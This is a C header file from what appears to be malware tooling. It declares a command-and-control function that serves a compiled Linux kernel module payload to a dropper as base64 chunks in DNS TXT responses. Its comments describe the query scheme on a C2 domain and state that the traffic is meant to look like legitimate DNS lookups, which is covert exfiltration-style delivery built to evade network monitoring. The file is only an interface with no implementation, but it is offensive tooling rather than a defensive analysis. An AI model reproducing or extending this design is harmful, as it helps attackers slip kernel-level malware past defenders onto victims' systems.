/**
 * @file dns.h
 * @brief DNS covert delivery — C2 acts as an authoritative DNS server.
 *
 * The dropper sends iterative DNS TXT queries for:
 *   <seq>.<session>.c2domain.com
 *
 * Each response carries a base64-encoded chunk of the .ko payload.
 * The first query (seq=0) returns the total chunk count so the dropper
 * knows how many queries to issue.
 *
 * All traffic looks like legitimate DNS lookups to an external resolver.
 * Requires the C2 to be reachable as a DNS server (UDP 53).
 */

#ifndef DNS_H
#define DNS_H

#include <stdint.h>
#include <stddef.h>

/** Maximum bytes of payload per TXT record (DNS limit is 255). */
#define DNS_CHUNK_SIZE  180

/**
 * @brief Serve the .ko payload as DNS TXT record responses.
 *
 * Listens on UDP port 53, accepts iterative queries from the dropper
 * and responds with base64-encoded chunks of @p ko_path.
 * Blocks until all chunks have been delivered or a timeout occurs.
 *
 * @param port     UDP port to bind on (typically 53).
 * @param ko_path  Path to the compiled .ko file to serve.
 * @return         0 when all chunks delivered, -1 on error.
 */
int dns_serve_payload(uint16_t port, const char *ko_path);

#endif /* DNS_H */
